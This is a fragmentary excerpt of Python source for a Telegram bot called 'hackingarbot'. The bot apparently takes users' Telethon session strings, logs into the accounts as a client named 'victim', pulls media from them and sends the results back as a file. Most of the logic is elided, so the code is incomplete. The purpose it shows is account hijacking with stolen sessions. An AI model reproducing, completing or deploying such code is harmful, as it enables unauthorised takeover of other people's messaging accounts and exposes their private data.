...
from hackingarbot import BotClient
from hackingarbot import API_ID, API_HASH
APIID = str(API_ID)
...
async def _(event):
  try:
    ...
    mat = "https://t.me/Mrarnav_Projects"
...
async def _(event):
  if event.sender_id not in session.keys():
    ...
    try:
      ...
      media = await glad.download_media( "hackingarbot/downloads/")
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
      ...
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        ...
        with io.BytesIO(str.encode(gldtr)) as out_file:
          ...
          await event.client.send_file(
            ...
            out_file,
            force_document=True,
            thumb="hackingarbot/resources/Gladiators.jpeg",
            allow_cache = False,
